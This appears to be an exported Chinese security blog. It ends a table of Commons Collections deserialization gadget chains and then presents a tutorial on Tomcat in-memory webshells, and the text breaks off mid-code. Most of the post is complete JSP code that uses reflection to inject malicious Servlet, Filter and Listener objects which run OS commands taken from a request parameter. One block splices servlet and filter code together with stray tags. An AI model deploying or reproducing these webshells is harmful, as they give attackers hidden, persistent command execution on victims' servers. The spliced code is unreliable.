<tr>
<td align="center">CC3</td>
<td align="left">AnnotationInvocationHandler<br />LazyMap.decorate<br />ChainedTransformer<br />InstantiateTransformer<br />TrAXFilter<br />TemplatesImpl</td>
<td align="center">CC &lt;&#x3D; 3.2.1<br />Java &lt; 8u71</td>
<td align="center">低</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">CC4</td>
<td align="left">PriorityQueue<br />TransformingComparator<br />ChainedTransformer<br />InstantiateTransformer<br />TrAXFilter<br />TemplatesImpl</td>
<td align="center">CC4.0</td>
<td align="center">中</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CC5</td>
<td align="left">BadAttributeValueExpException<br />TiedMapEntry.toString<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
<td align="center">CC &lt;&#x3D; 3.2.1<br />Java &gt;&#x3D; 8u76<br />SecurityManger 未开启</td>
<td align="center">低</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">CC6</td>
<td align="left">HashMap<br />TiedMapEntry.hashCode<br />TiedMapEntry.getValue<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
<td align="center">CC &lt;&#x3D; 3.2.1</td>
<td align="center">高</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">CC7</td>
<td align="left">Hashtable&#x2F;HashMap<br />AbstractMap.equals<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
<td align="center">CC &lt;&#x3D; 3.2.1</td>
<td align="center">高</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">k1&#x2F;k2</td>
<td align="left">HashMap.readObject<br />TiedMapEntry.hashCode<br />TiedMapEntry.getValue<br />LazyMap.decorate<br />InvokerTransformer<br />TemplatesImpl</td>
<td align="center">K1: CC &lt;&#x3D; 3.2.1<br />K2: CC &#x3D;&#x3D; 4.0</td>
<td align="center">最高</td>
<td align="center">特别的：可以打 shiro 1.2.24 的默认环境</td>
</tr>
<tr>
<td align="center">K3&#x2F;K4</td>
<td align="left">与 6 一致</td>
<td align="center">K3: CC &lt;&#x3D; 3.2.1<br />K4: CC &#x3D;&#x3D; 4.0</td>
<td align="center">最高</td>
<td align="center">无任何依赖，是 6 的简化版</td>
</tr>
</tbody></table>
<p>CommonsCollections 有两个大版本，K3&#x2F;K4 是这两个版本最好用的两条链，因为它们对环境毫无依赖，仅仅依赖于库本身。其次的 K1&#x2F;K2 是两个使用字节码加载的利用链，TemplatesImpl 在部分环境下反序列化会被 SecurityManager 禁用，但这两个链可以打 shiro 1.2.24 的默认环境，所以也是很有实战价值的。综合来看，K1<del>K4 这四条链可以完整代替且超越之前的 1</del>7，他们加起来代表了 CommonsCollections 各种可能的情况。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>CC</tag>
      </tags>
  </entry>
  <entry>
    <title>Java内存马 - 重构</title>
    <url>/WebShell/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>还是觉得乱，决定删减前置知识（前置知识要学了才看得懂）。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown90729456_p0.jpg"></p>
<span id="more"></span>

<p>看了一些内存马的文，感觉基本都写的不全，或者有的东西一笔带过，所以打算写一篇详解的。</p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a><center>概述</center></h1><p>内存马是无文件Webshell，无文件的意思就是并没有写入文件，而是修改或者插入代码的方式来实现的WebShell，修改或者插入的代码也并不是永久存在于代码中，而是随着生命周期动态生成和删除的，<del>也可以这样理解通过服务实现的内存马的原理就像是MVC架构，即通过路由访问控制器</del>（该解释略有偏差），至于修改或者插入代码的位置可以是<code>TransformedMap</code>中，也可以是<code>Servlet</code>中，这要看注入内存马的位置于何处。</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><center>前置知识</center></h1><h2 id="Java-web三大件"><a href="#Java-web三大件" class="headerlink" title="Java web三大件"></a>Java web三大件</h2><p>详情可参考：<a href="https://blog.csdn.net/chenwiehuang/article/details/80811193" title="java web请求三大器——listener、filter、servlet">java web请求三大器——listener、filter、servlet</a></p>
<p>启动的顺序为<code>listener</code>-&gt;<code>Filter</code>-&gt;<code>servlet</code>，但是执行顺序与其特性相关，下面简单讲一下三大件</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>详情可参考：<a href="https://segmentfault.com/a/1190000023475177">Tomcat 架构原理解析到架构设计借鉴</a></p>
<p>简单理解，Tomcat是HTTP服务器+Servlet容器，对我们屏蔽了应用层协议和网络通信细节，给我们的是标准的 Request 和 Response 对象；对于具体的业务逻辑则作为变化点，交给我们来实现</p>
<h2 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h2><p>要懂！</p>
<h2 id="Java-Instrumentation"><a href="#Java-Instrumentation" class="headerlink" title="Java Instrumentation"></a>Java Instrumentation</h2><p>要懂！</p>
<h2 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h2><p>要懂！ </p>
<h2 id="Filter和Servlet的回顾性总结"><a href="#Filter和Servlet的回顾性总结" class="headerlink" title="Filter和Servlet的回顾性总结"></a>Filter和Servlet的回顾性总结</h2><p>对于基于<code>Filter</code>和<code>Servlet</code>实现的简单架构项目，代码审计的重心集中于找出所有的<code>Filter</code>分析其过滤规则，找出是否有做全局的安全过滤、敏感的URL地址是否有做权限校验并尝试绕过Filter过滤。第二点则是找出所有的<code>Servlet</code>，分析<code>Servlet</code>的业务是否存在安全问题,如果存在安全问题是否可以利用？是否有权限访问？利用时是否被<code>Filter</code>过滤等问题，切勿看到<code>Servlet</code>、JSP中的漏洞点就妄下定论，不要忘了<code>Servlet</code>前面很有可能存在一个全局安全过滤的<code>Filter</code>。</p>
<ul>
<li><p><code>Filter</code>和<code>Servlet</code>都是Java Web提供的API，简单的总结了下有如下共同点。</p>
<ol>
<li><p><font color="red"><strong>Filter和Servlet都需要在web.xml或注解(@WebFilter、@WebServlet)中配置，而且配置方式是非常的相似的。</strong></font></p>
</li>
<li><p><font color="green"><strong>Filter和Servlet都可以处理来自Http请求的请求，两者都有request、response对象。</strong></font></p>
</li>
<li><p><font color="purple"><strong>Filter和Servlet基础概念不一样，Servlet定义是容器端小程序，用于直接处理后端业务逻辑，而Filter的思想则是实现对Java Web请求资源的拦截过滤。</strong></font></p>
</li>
<li><p><font color="silver"><strong>Filter和Servlet虽然概念上不太一样，但都可以处理Http请求，都可以用来实现MVC控制器(Struts2和Spring框架分别基于Filter和Servlet技术实现的)。</strong></font></p>
</li>
<li><p><font color="blue"><strong>一般来说Filter通常配置在MVC、Servlet和JSP请求前面，常用于后端权限控制、统一的Http请求参数过滤(统一的XSS、SQL注入、Struts2命令执行等攻击检测处理)处理，其核心主要体现在请求过滤上，而Servlet更多的是用来处理后端业务请求上。</strong></font></p>
</li>
</ol>
</li>
</ul>
<h1 id="内存马的发展历史"><a href="#内存马的发展历史" class="headerlink" title="内存马的发展历史"></a>内存马的发展历史</h1><p>内存马早在17年n1nty师傅的<a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcat 源代码调试笔记 - 看不见的 Shell</a>中已初见端倪,因为利用困难，一直不温不火。</p>
<p>18年经过rebeyong师傅使用agent技术加持后，拓展了内存马的使用场景—— <a href="https://www.cnblogs.com/rebeyond/p/9686213.html">利用进程注入”实现无文件不死webshell</a>，然终停留在奇技淫巧上</p>
<p>在各类HW洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。20年，LandGrey师傅构造了Spring controller内存马——<a href="https://landgrey.me/blog/12/#top">基于内存 Webshell 的无文件攻击技术研究</a>可以算是一波热潮起</p>
<h1 id="内存马的类型"><a href="#内存马的类型" class="headerlink" title="内存马的类型"></a>内存马的类型</h1><p><code>Servlet-API类型</code>：filter型、servlet型、listener型 （使用 servlet-api 的具体实现）<br>大概原理：通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马</p>
<p><code>spring类型</code>interceptor型、controller型 （使用框架如 spring&#x2F;struts2）</p>
<p><code>字节码增强型</code><br>大概原理：通过java的instrumentation动态修改已有代码，进而实现命令执行等功能，是通过动态注册的方式实现，动态注册使用职责链设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</p>
<h1 id="Servlet-API"><a href="#Servlet-API" class="headerlink" title="Servlet-API"></a>Servlet-API</h1><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><ul>
<li>实现过程：<ol>
<li>创建一个恶意的<code>servlet</code></li>
<li>获取当前的<code>StandardContext</code></li>
<li>将恶意<code>servlet</code>封装成<code>wrapper</code>添加到<code>StandardContext</code>的<code>children</code>当中</li>
<li>添加<code>ServletMapping</code>将访问的URL和wrapper进行绑定</li>
</ol>
</li>
</ul>
<p>执行下面的代码，访问当前应用的&#x2F;shell路径，加上cmd参数就可以命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 创建恶意Servlet</span></span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 获取StandardContext</span></span><br><span class="line">    org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用Wrapper对其进行封装</span></span><br><span class="line">    org.apache.catalina.<span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> standardCtx.createWrapper();</span><br><span class="line">    newWrapper.setName(<span class="string">&quot;jweny&quot;</span>);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(servlet);</span><br><span class="line">    newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加封装后的恶意Wrapper到StandardContext的children当中</span></span><br><span class="line">    standardCtx.addChild(newWrapper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加ServletMapping将访问的URL和Servlet进行绑定</span></span><br><span class="line">    standardCtx.addServletMapping(<span class="string">&quot;/shell&quot;</span>,<span class="string">&quot;jweny&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>另一种实现方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.io.IOException&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="number">1</span> request <span class="built_in">this</span> file --&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span> request thisfile/../evilpage?cmd=calc --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request1</span> <span class="operator">=</span> (HttpServletRequest) req;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response1</span> <span class="operator">=</span> (HttpServletResponse) res;</span><br><span class="line">        <span class="keyword">if</span> (request1.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            Runtime.getRuntime().exec(request1.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            response1.sendError(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext); </span><br><span class="line"><span class="type">EvilServlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilServlet</span>();</span><br><span class="line">org.apache.catalina.<span class="type">Wrapper</span> <span class="variable">evilWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">evilWrapper.setName(<span class="string">&quot;evilPage&quot;</span>);</span><br><span class="line">evilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">evilWrapper.setServlet(evilServlet);</span><br><span class="line">evilWrapper.setServletClass(evilServlet.getClass().getName());</span><br><span class="line">standardContext.addChild(evilWrapper);</span><br><span class="line">standardContext.addServletMapping(<span class="string">&quot;/evilpage&quot;</span>, <span class="string">&quot;evilPage&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;动态注入servlet成功&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;DefaultFilter&quot;</span>;</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>); </span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="type">DefaultFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFilter</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    <span class="comment">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/abcd&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">    out.write(<span class="string">&quot;Inject success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    out.write(<span class="string">&quot;Injected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h2><p>Listener的监听主要分为三类：</p>
<ul>
<li>ServletContext监听：用于对Servlet整个上下文进行监听（创建、销毁）</li>
<li>Session监听：对Session的整体状态的监听</li>
<li>Request监听：用于对Request请求进行监听（创建、销毁）</li>
</ul>
<p>对于这三类，熟悉java和Tomcat的同学应该知道，对于request的请求和篡改是常见的利用方式，另两者涉及到服务器的启动跟停止，或者是Session的建立跟销毁，就不太适合</p>
<p>过程：</p>
<ul>
<li>创建恶意Listener</li>
<li>将其添加到ApplicationEventListener中去</li>
<li>上传并访问下面这个jsp文件</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">  java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) field.get(obj);</span><br><span class="line">  <span class="comment">//获取ApplicationContext</span></span><br><span class="line">  field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) field.get(applicationContext);</span><br><span class="line">  <span class="comment">//获取StandardContext</span></span><br><span class="line">  <span class="type">ListenerDemo</span> <span class="variable">listenerdemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListenerDemo</span>();</span><br><span class="line">  <span class="comment">//创建能够执行命令的Listener</span></span><br><span class="line">  standardContext.addApplicationEventListener(listenerdemo);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerDemo</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;requestDestroyed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;requestInitialized&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">      Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e )&#123;</span><br><span class="line">      <span class="comment">//e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>另一种实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;!-- <span class="number">1</span>、exec <span class="built_in">this</span>--&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span>、request any url with a parameter of <span class="string">&quot;shell&quot;</span> --&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title 